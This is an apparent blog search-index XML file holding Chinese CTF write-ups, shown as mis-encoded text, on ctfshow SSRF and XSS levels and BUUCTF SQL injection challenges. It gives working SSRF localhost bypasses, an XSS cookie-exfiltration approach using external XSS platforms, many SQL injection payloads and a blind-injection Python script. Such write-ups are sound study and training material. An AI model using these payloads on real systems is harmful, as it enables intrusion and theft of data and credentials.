<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ssrf(ctfshow)</title>
      <link href="/2023/08/23/ssrf(ctfshow)/"/>
      <url>/2023/08/23/ssrf(ctfshow)/</url>
      
        <content type="html"><![CDATA[<p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#39;url&#39;];$ch=curl_init($url);//åˆå§‹åŒ– cURL ä¼šè¯curl_setopt($ch, CURLOPT_HEADER, 0);//å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºã€‚curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚$result=curl_exec($ch);//æ‰§è¡Œ cURL ä¼šè¯curl_close($ch);//å…³é—­ cURL ä¼šè¯echo ($result);?&gt;</code></pre><p>payload: url&#x3D;127.0.0.1&#x2F;flag.php</p><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><p>parse_url()å‡½æ•°ä¼šè§£æurlå¹¶è¿”å›å…³è”æ•°ç»„</p><pre><code>$url = &#39;http://username:password@hostname:9090/path?arg=value#anchor&#39;;var_dump(parse_url($url));array(8) &#123;  [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot;  [&quot;host&quot;]=&gt;  string(8) &quot;hostname&quot;  [&quot;port&quot;]=&gt;  int(9090)  [&quot;user&quot;]=&gt;  string(8) &quot;username&quot;  [&quot;pass&quot;]=&gt;  string(8) &quot;password&quot;  [&quot;path&quot;]=&gt;  string(5) &quot;/path&quot;  [&quot;query&quot;]=&gt;  string(9) &quot;arg=value&quot;  [&quot;fragment&quot;]=&gt;  string(6) &quot;anchor&quot;&#125;</code></pre><p>è¿™å…³çœ‹ä¼¼ä½¿ç”¨äº†æ­£åˆ™åŒ¹é…preg_matchï¼Œä½†ç¼ºå°‘å‚æ•°ï¼Œæ²¡å•¥ç”¨</p><pre><code>url=http://127.0.0.1/flag.phpurl=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.php     //16è¿›åˆ¶url=http://0177.0.0.1/flag.php   //8è¿›åˆ¶url=http://2130706433/flag.php     //10è¿›åˆ¶æ•´æ•°æ ¼å¼url=http://0x7F000001/flag.php     //16è¿›åˆ¶æ•´æ•°æ ¼å¼url=http://127.0.1/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>ç›´æ¥ç»•è¿‡</p><pre><code>url=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><p>è¿™é¢˜æŠŠ0å’Œ1éƒ½å±è”½äº†</p><p>http(s):<em>&#x2F;&#x2F;sudo.cc&#x2F;æŒ‡å‘127.0.0.1</em></p><pre><code>url=http://sudo.cc/flag.php</code></pre><p>ä¹Ÿå¯ä»¥ç”¨è‡ªå·±çš„åŸŸåï¼Œè®©ä»–è§£æåˆ°127.0.0.1æ¥ç”¨</p><pre><code>&lt;?php header(&quot;Location: http://127.0.0.1/flag.php&quot;);# POST: url=http://your-domain/ssrf.php</code></pre><h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><p>å¤šäº†ä¸€ä¸ªé™åˆ¶è®©hostä½æ•°å°äº5</p><pre><code>url=http://0/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><p>é™åˆ¶hostä½æ•°å°äº3</p><pre><code>url=http://0/flag.php</code></pre><h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><p>åˆ©ç”¨302è·³è½¬å’Œdnsé‡ç»‘å®šéƒ½å¯ä»¥ã€‚</p><pre><code>&lt;?phpheader(&quot;Location:http://127.0.0.1/flag.php&quot;); </code></pre><p>ç„¶åpayloadå†™è‡ªå·±çš„è¿™ä¸ªåœ°å€å°±å¯ä»¥äº†ã€‚<br>payload:<a href="http://xxx/a.php">http://xxx/a.php</a></p><p>2ã€åœ¨è¿™ä¸ªç½‘ç«™æ³¨å†Œä¸€ä¸ªè´¦å·<code>http://ceye.io/</code>ï¼Œç„¶åä¼šç»™ä½ åˆ†é…ä¸€ä¸ªåŸŸåï¼Œä¿®æ”¹æˆå¦‚ä¸‹çš„å†…å®¹ï¼Œç¬¬ä¸€ä¸ªéšä¾¿å¡«ï¼Œç¬¬äºŒä¸ªå†™127.0.0.1</p><img src="/2023/08/23/ssrf(ctfshow)/132206.png" class=""><p>å¤šè¯•å‡ æ¬¡å°±å¯ä»¥</p><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><p>urlå¿…é¡»ä»¥<a href="http://ctf.å¼€å¤´,å¿…é¡»ä»¥showç»“å°¾./">http://ctf.å¼€å¤´ï¼Œå¿…é¡»ä»¥showç»“å°¾ã€‚</a><br>ä»¥showç»“å°¾æ¯”è¾ƒå¥½åŠï¼Œè¦ä¹ˆ#showï¼Œè¦ä¹ˆ?a&#x3D;showè¿™æ ·çš„éƒ½å¯ä»¥ã€‚<br>ä»¥<a href="http://ctf.%E5%BC%80%E5%A4%B4%E7%9A%84%E8%AF%9D%EF%BC%8C%E5%8A%A0%E4%B8%8A%E4%B8%80%E4%B8%AA@127.0.0.1å°±å¯ä»¥ç»•è¿‡äº†,è¿™æ ·parse_urlè§£æå‡ºæ¥çš„hostæ˜¯127.0.0.1,è€ƒè™‘åˆ°ftp//user[:pass]@ip[:port]/path%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%89%8D%E9%9D%A2%E7%9A%84ctf.%E4%BC%9A%E8%A2%AB%E8%A7%A3%E6%9E%90%E6%88%90user%E3%80%82">http://ctf.å¼€å¤´çš„è¯ï¼ŒåŠ ä¸Šä¸€ä¸ª@127.0.0.1å°±å¯ä»¥ç»•è¿‡äº†ï¼Œè¿™æ ·parse_urlè§£æå‡ºæ¥çš„hostæ˜¯127.0.0.1ï¼Œè€ƒè™‘åˆ°ftp://user[:pass]@ip[:port]/pathï¼Œå› æ­¤å‰é¢çš„ctf.ä¼šè¢«è§£ææˆuserã€‚</a></p><pre><code>url=http://ctf.@127.0.0.1/flag.php#show</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss(ctfshow)</title>
      <link href="/2023/08/16/xss(ctfshow)/"/>
      <url>/2023/08/16/xss(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>è¿™å…³æ²¡æœ‰è¿‡æ»¤ï¼Œä½†æœ‰botæ‹¦æˆªï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨</p><pre><code>&lt;script&gt;var x=document.cookie;alert(x);&lt;/script&gt;</code></pre><p>ä¼šå‘ç°å¼¹å‡ºyou are not adminï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å°†æ•°æ®å¤–å¸¦</p><p>æ–¹å¼1ï¼šxsså¹³å°</p><pre><code>https://xsshs.cn/ï¼Œhttps://hk.sb/,https://xss.pt/ï¼Œhttp://xsscom.com https://xs.sb </code></pre><p>åœ¨xsså¹³å°åˆ›å»ºé¡¹ç›®ï¼Œé€‰æ‹©é»˜è®¤æ¨¡å—å³å¯ï¼Œå¤åˆ¶ç”Ÿæˆçš„xssä»£ç ï¼Œå¤åˆ¶åˆ°é¢˜ç›®ç•™è¨€æ¡†ä¸­ï¼Œåˆ·æ–°ä¸‹é¡µé¢ï¼Œç„¶ååœ¨å¹³å°æŸ¥çœ‹é¡¹ç›®</p><img src="/2023/08/16/xss(ctfshow)/165449.png" class=""><p>æ–¹å¼äºŒï¼švps</p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf</title>
      <link href="/2023/08/03/buuctf/"/>
      <url>/2023/08/03/buuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h3><p>è¿™é“é¢˜æµ‹å‡ºæ¥æ˜¯å•å¼•å·é—­åˆï¼Œä¹Ÿæ²¡æœ‰ä¸Šé¢è¿‡æ»¤ï¼Œç›´æ¥ç”¨ä¸‡èƒ½å¯†ç å°±èƒ½çˆ†å‡ºflag</p><pre><code>payload ?username=admin&#39; or 1=1-- -&amp;password=admin</code></pre><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>å¯¹æŸ¥è¯¢ç‚¹è¿›è¡Œfuzzæµ‹è¯•å‘ç°å¾ˆå¤šå…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†</p><img src="/2023/08/03/buuctf/222647.png" class=""><p>å›åŒ…é•¿åº¦ä¸º500çš„éƒ½æ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œè¿™é‡Œ;æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå°è¯•å †å æ³¨å…¥</p><p>é¦–å…ˆshow tables;</p><img src="/2023/08/03/buuctf/224429.png" class=""><p>ç„¶åshow columns from Flag;ï¼Œä¸è¡Œï¼Œè¢«è¿‡æ»¤äº†ã€‚</p><p>å‚è€ƒåˆ«äººwp <a href="https://blog.csdn.net/StevenOnesir/article/details/110203051%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95">https://blog.csdn.net/StevenOnesir/article/details/110203051ï¼Œæœ‰ä¸¤ç§è§£æ³•</a></p><p>è§£æ³•1ï¼š</p><p>è¾“å…¥æ•°å­—åªå›æ˜¾1ï¼Œè¾“å…¥å­—æ¯å•¥ä¹Ÿä¸å›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ¨å‡ºåç«¯ä»£ç æœ‰ æˆ– ç»“æ„ï¼Œè€Œä¸”ä¸ç›´æ¥å›æ˜¾flagï¼Œä½†ä½œä¸ºä¸€é“é¢˜ç›®ï¼Œfromåº”è¯¥æ˜¯from flagï¼Œæ‰€ä»¥çŒœæµ‹åç«¯ä»£ç ä¸ºï¼š</p><pre><code>select $_POST[&#39;query&#39;] || flag from flag</code></pre><p>æ‰€ä»¥payloadå°±å˜çš„ç®€å•ï¼š</p><pre><code>*ï¼Œ1</code></pre><p>è¿™é‡Œï¼Œæˆ‘ä»¬çš„è¯­å¥å˜æˆäº†</p><pre><code>select *ï¼Œ1 from flag</code></pre><p>select 1 çš„æ„æ€æ˜¯å»ºç«‹ä¸€ä¸ªä¸´æ—¶åˆ—ï¼Œè¿™ä¸ªåˆ—çš„åˆ—åä¸º1ï¼Œæ‰€æœ‰åˆå§‹å€¼éƒ½è¢«è®¾ä¸º1ã€‚</p><p>è§£æ³•2ï¼š</p><p>é€šè¿‡ä¿®æ”¹SQLé…ç½®å°†æˆ–è¿ç®—ç¬¦||è®¾ç½®ä¸ºè¿æ¥ç¬¦</p><pre><code>payload 1;set sql_mode=pipes_as_concat;select 1</code></pre><p>è¦æ³¨æ„åˆ†å·éš”æ–­äº†å‰é¢çš„å‘½ä»¤ï¼Œæ‰€ä»¥è¦å†æ¬¡æ·»åŠ select!!</p><p>ä¸Šé¢çš„payloadç­‰åŒäº</p><pre><code>select concat(1,flag) from Flag</code></pre><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h3><p>æµ‹å‡ºæ¥usernameæœ‰æ³¨å…¥ç‚¹ï¼Œç”¨å•å¼•å·é—­åˆã€‚</p><p>æµ‹æ•°æ®åº“å</p><pre><code>username=-1&#39; union select 1,2,database()-- -&amp;password=admin//åº“åä¸ºgeek</code></pre><p>æµ‹è¡¨å</p><pre><code>username=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; -- -&amp;password=admin//è¡¨åä¸ºgeekuser,l0ve1ysq1</code></pre><p>ä¸¤ä¸ªè¡¨é‡Œé¢éƒ½æœ‰id,uername,password</p><p>æœ€ç»ˆåœ¨l0ve1ysq1è¡¨é‡Œæ‰¾åˆ°äº†flag</p><pre><code>username=-1&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)-- -&amp;password=admin</code></pre><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h3><p>æµ‹å‡ºæ¥ä¹Ÿæ˜¯å•å¼•å·é—­åˆï¼Œä½†ç”¨order by 3æµ‹è¯•æ—¶å‘ç°æŠ¥é”™æ—¶â€der 3â€ï¼Œè¯´æ˜orå’Œbyè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŒæ‹¼å³å¯ç»•è¿‡ï¼Œè¿™é“é¢˜å‡ ä¹æ‰€æœ‰å…³é”®å­—éƒ½å¯ä»¥ç”¨åŒæ‹¼ç»•è¿‡ï¼Œå…ˆæŸ¥åº“åï¼š</p><pre><code>?username=-1&#39; uunionnion seselectlect 1,2,database()-- -&amp;password=admin//geek</code></pre><p>å†æŸ¥è¡¨æ˜ï¼š</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39; -- -&amp;password=admin//b4bsql,geekuser</code></pre><p>å†æŸ¥å­—æ®µï¼š</p><pre><code>username=-1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; -- -&amp;password=admin//id,username,password</code></pre><p>æœ€ç»ˆåœ¨b4bsqlè¡¨é‡Œæ‰¾åˆ°äº†flag</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) frfromom b4bsql -- -&amp;password=admin</code></pre><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>æäº†ä¸€åœˆå‘ç°è¿()éƒ½è¿‡æ»¤äº†ï¼Œçœ‹åˆ«äººwpæ‰å‘ç°æºç æœ‰ä¸ªæ³¨é‡Šï¼š</p><pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5base32è§£ç ï¼šc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==base64è§£ç ï¼šselect * from user where username = &#39;$name&#39;</code></pre><pre><code>Base64å’ŒBase32 åŒºåˆ«ï¼šbase64ä¸­åŒ…å«å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰ï¼Œå°å†™å­—æ¯ï¼ˆa-zï¼‰ï¼Œæ•°å­—0â€”9ä»¥åŠ+/ï¼›base32ä¸­åªåŒ…å«å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰å’Œæ•°å­—234567</code></pre><p>åŒæ—¶ï¼Œè¿™ä¸€å…³åˆ©ç”¨sqliçš„ç‰¹æ€§ï¼š<strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚</strong></p><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨è”åˆæŸ¥è¯¢è®¿é—®ï¼Œä¸€ä¸ªçœŸå®å­˜åœ¨çš„ç”¨æˆ·åå’Œä¸€ä¸ªæˆ‘ä»¬è‡ªå·±ç¼–é€ çš„å¯†ç ï¼Œå°±ä¼šä½¿è™šæ‹Ÿæ•°æ®æ··æ·†adminå¯†ç ï¼Œä»è€Œä½¿æˆ‘ä»¬æˆåŠŸç™»å½•ï¼Œå¾—åˆ° flag</p><p>æˆ‘ä»¬è¿™é¢˜å¯ä»¥æµ‹å‡ºæœ‰ä¸‰ä¸ªåˆ—ï¼ŒæŒ‰ç…§æŠ¥é”™å›æ˜¾ï¼Œå¯ä»¥ç¡®å®šç¬¬äºŒä¸ªåˆ—æ˜¯username,ç¬¬ä¸‰ä¸ªåˆ—æ˜¯passwordï¼Œé‚£ä¹ˆç¬¬ä¸€åˆ—åº”è¯¥æ˜¯idï¼Œæˆ‘ä»¬å°è¯•æ„é€ å‡ºï¼š</p><pre><code>name=1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1</code></pre><p>å¦‚æœä½ çœ‹è¿‡è¿™é¢˜çš„æºä»£ç å°±ä¼šå‘ç°ï¼Œå¯†ç æ˜¯è¦äºæ•°æ®åº“ä¸­è¢«md5åŠ å¯†è¿‡çš„å¯†ç è¿›è¡Œå¯¹æ¯”çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸‰åˆ—çš„å­—ç¬¦ä¸²æ˜¯1çš„md5å€¼ã€‚</p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h3><p>æµ‹è¯•äº†ä¸€ä¸‹union,ç©ºæ ¼éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¯•è¯•æŠ¥é”™æ³¨å…¥ï¼Œç©ºæ ¼ç”¨æ‹¬å·ä»£æ›¿ï¼š</p><pre><code>?username=-1&#39;or(updatexml(1,concat(0x7e,database()),1))%23&amp;password=adminusername=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=admin//geek</code></pre><p>æµ‹è¡¨åï¼Œç­‰å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨likeä»£æ›¿</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like&#39;geek&#39;)),1)%23&amp;password=admin//H4rDsq1</code></pre><p>æµ‹å­—æ®µ</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;)),1)%23&amp;password=admin//id,username,password</code></pre><p>çˆ†æ•°æ®</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(concat_ws(0x7e,username,password)))from(H4rDsq1))),1)%23&amp;password=admin//~flag~flag&#123;53f3bd9d-f44f-4ce5-a0</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œåªå‡ºæ¥äº†å·¦åŠéƒ¨åˆ†ï¼Œä½¿ç”¨right()ï¼š</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(right(group_concat(concat_ws(0x7e,username,password)),20))from(H4rDsq1))),1)%23&amp;password=admin//~5-a0c8-2720a6d31213&#125;</code></pre><h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p>ç”¨order by æµ‹å‡ºæœ‰ä¸¤åˆ—æ•°æ®ï¼Œç»§ç»­union select 1,2æ—¶å‘ç°çˆ†å‡ºäº†è¿‡æ»¤çš„å­—ç¬¦ï¼š</p><img src="/2023/08/03/buuctf/155441.png" class=""><p>ç”¨extractvalueä¹Ÿåªèƒ½æ³¨å‡ºåº“å</p><p>è¯•è¯•å †å æ³¨å…¥ï¼Œæµ‹åº“åï¼š</p><pre><code>inject=1&#39;;show databases;</code></pre><img src="/2023/08/03/buuctf/161321.png" class=""><p>æµ‹è¡¨åï¼š</p><pre><code>?inject=1&#39;;show tables;</code></pre><img src="/2023/08/03/buuctf/161643.png" class=""><p>æµ‹å­—æ®µï¼Œå¦‚æœtableNameæ˜¯çº¯æ•°å­—ï¼Œéœ€è¦ç”¨&#96;åŒ…è£¹ï¼š</p><pre><code>?inject=1&#39;;show columns from `1919810931114514`;</code></pre><img src="/2023/08/03/buuctf/170603.png" class=""><p>ç„¶åå°±æ— èƒ½ä¸ºåŠ›ï¼Œçœ‹çœ‹å¤§ä½¬wp</p><p><strong>è§£æ³•ä¸€ï¼š</strong></p><p>å¯ä»¥çœ‹åˆ°wordsè¡¨é‡Œæœ‰ä¸¤ä¸ªå±æ€§ï¼Œå³ä¸¤åˆ—ï¼šid å’Œdata<br>è€Œ1919810931114514è¡¨é‡Œåªæœ‰ä¸€ä¸ªå±æ€§åˆ—<br>è¯´æ˜è¾“å…¥æ¡†å¯èƒ½æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨<br>åå°sqlè¯­å¥å¯èƒ½ä¸º</p><pre><code>select id,data from words where id=</code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è·å–flagäº†ï¼Œæ€è·¯æ˜¯æŠŠ1919810931114514è¡¨æ”¹åä¸ºwordsè¡¨ï¼ŒæŠŠå±æ€§åflagæ”¹ä¸ºidï¼Œç„¶åç”¨1â€™ or 1&#x3D;1;# æ˜¾ç¤ºflagå‡ºæ¥ï¼Œåœ¨è¿™ä¹‹å‰å½“ç„¶è¦å…ˆæŠŠwordsè¡¨æ”¹åä¸ºå…¶ä»–</p><pre><code>1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#</code></pre><p><strong>è§£æ³•äºŒï¼š</strong></p><p> å› ä¸ºselectå…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é¢„ç¼–è¯‘çš„æ–¹å¼æ‹¼æ¥select å…³é”®å­—ï¼š</p><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><p>å…³äºé¢„ç¼–è¯‘ï¼Œå¯ä»¥å‚è€ƒï¼š<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p><p><strong>è§£æ³•ä¸‰</strong>ï¼š</p><p>è¿˜æ˜¯é¢„ç¼–è¯‘ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥å°†sqlè¯­å¥ç›´æ¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p><pre><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></pre><p>æ³¨ï¼šprepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</p><p>â€‹    SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</p><p><strong>è§£æ³•å››ï¼š</strong></p><p>æ­¤é¢˜è¿˜å¯ä»¥é€šè¿‡handleç›´æ¥å‡ºç­”æ¡ˆï¼š</p><pre><code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code></pre><pre><code class="text">æ‰“å¼€è¡¨ï¼šHANDLER è¡¨å OPEN ;æŸ¥çœ‹æ•°æ®ï¼šHANDLER è¡¨å READ next;å…³é—­è¡¨ï¼šHANDLER è¡¨å READ CLOSE;</code></pre><p>å¯ä»¥å‚è€ƒ <a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>å±è”½äº†alterå’Œprepareã€‚è¿˜å¯ä»¥ä½¿ç”¨ä¸Šä¸€é“é¢˜çš„ç¬¬ä¸‰ç§æ–¹æ³•ã€‚</p><h3 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p>è¿™é“é¢˜è¾“å…¥1å’Œ2ä¼šè¾“å‡ºä¸åŒçš„è¯ï¼Œè¾“å…¥å…¶ä»–æ•°å­—ä¼šæ˜¾ç¤ºError Occured When Fetch Result.</p><p>å°è¯•æŠ¥é”™æ³¨å…¥å‘ç°åªæ˜¾ç¤ºbool(false)ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯•è¯•ç›²æ³¨ï¼Œè¿™é“é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨æ‹¬å·å¯ä»¥ä»£æ›¿ï¼š</p><pre><code>id=if(1=1,1,2)//Hello, glzjin wants a girlfriend.id=if(1=2,1,2)//Do you want to be my girlfriend?</code></pre><p>å‘ç°å¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ï¼Œé¢˜ç›®æç¤ºäº†flagåœ¨flagè¡¨é‡Œçš„flagå­—æ®µé‡Œï¼Œç›´æ¥çˆ†æ•°æ®ï¼š</p><pre><code>id=if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)</code></pre><p>è„šæœ¬ï¼š</p><pre><code>import requestsif __name__ == &#39;__main__&#39; :    url = &#39;http://bb5603db-211d-4c37-9796-e7a42349e7c8.node4.buuoj.cn:81/index.php&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 127        while low &lt; high:            mid = (low + high) // 2            payload = f&#39;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&#39;            data = &#123;                &quot;id&quot;:payload            &#125;            r = requests.post(url=url,data=data)            if &#39;Hello&#39; in r.text:                low = mid + 1            else:                high = mid        if low != 32:            result += chr(low)        else:            break        print(result)</code></pre><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h3><p>è¿™é“é¢˜å¾ˆå‘ï¼Œåœ¨ç™»å½•æ¡†é‡Œçæ³¨äº†åŠå¤©ï¼Œæ²¡æœ‰å¤´ç»ªï¼Œæœ€åçœ‹åˆ«äººwpæ‰çŸ¥é“æ³¨å…¥ç‚¹åœ¨é‚£å‡ ä¸ªæŒ‰å¦çš„åœ°æ–¹</p><p>åˆ†åˆ«ç‚¹å‡»é‚£å‡ ä¸ªæŒ‰é’®ä½ å°±ä¼šå‘ç°urlé‡Œçš„idä¼šå˜ï¼Œè¿™å°±æ˜¯æ³¨å…¥ç‚¹ï¼Œgetå‹æ³¨å…¥ï¼Œè€Œä¸”è¿™é“é¢˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>æµ‹è¯•äº†ä¸€ä¸‹å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ#ï¼Œandï¼Œorder 